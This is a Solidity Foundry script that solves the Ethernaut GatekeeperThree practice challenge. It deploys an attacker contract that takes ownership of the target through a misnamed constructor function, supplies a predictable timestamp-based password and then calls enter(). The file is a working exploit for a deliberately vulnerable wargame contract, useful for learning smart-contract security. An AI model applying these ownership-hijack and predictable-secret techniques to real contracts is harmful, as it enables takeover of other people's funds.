// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol"; // Foundry scripting utilities
import "../src/GateKeeperThree.sol"; // Import the challenge contract

// Script to solve the GatekeeperThree Ethernaut challenge
contract GatekeeperThreeSolution is Script {

    // Instance of the deployed GatekeeperThree contract
    address payable public gatekeeperInstanceAddress = payable(0xYourInstanceAddressHere); 

    GatekeeperThree public gatekeeper;  // GatekeeperThree contract instance
    GateAttacker public attackerInstance;  // Attacker contract instance

    // Main function to execute the exploit
    function run() external {
        // Start broadcasting transactions from the private key specified in environment variables
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Initialize the GatekeeperThree contract instance and the attacker contract
        gatekeeper = GatekeeperThree(gatekeeperInstanceAddress);
        attackerInstance = new GateAttacker(gatekeeperInstanceAddress);
        
        // Send a small amount of ether greater than 0.001 to the GatekeeperThree contract to ensure it has a balance
        (bool success, ) = address(gatekeeper).call{value: 0.00101 ether}("");
        require(success, "Ether transfer to GatekeeperThree failed");

        // Call the enter() function via the attacker contract
        attackerInstance.attack();

        // Stop broadcasting transactions
        vm.stopBroadcast();
    }
}

// Attacker contract to exploit the GatekeeperThree contract
contract GateAttacker {

    GatekeeperThree public gatekeeper;  // GatekeeperThree instance

    // Constructor initializes the GatekeeperThree contract and sets ownership
    constructor(address gatekeeperAddress) {
        gatekeeper = GatekeeperThree(payable(gatekeeperAddress));

        // Call the pseudo-constructor to set this contract as the owner
        gatekeeper.construct0r(); 

        // Create the SimpleTrick contract through the GatekeeperThree contract
        gatekeeper.createTrick();

        // Retrieve the password by passing block timestamp (used internally in the target)
        gatekeeper.getAllowance(block.timestamp);
    }

    // Function to call the enter() function of GatekeeperThree and complete the challenge
    function attack() public {
        gatekeeper.enter();
    }
}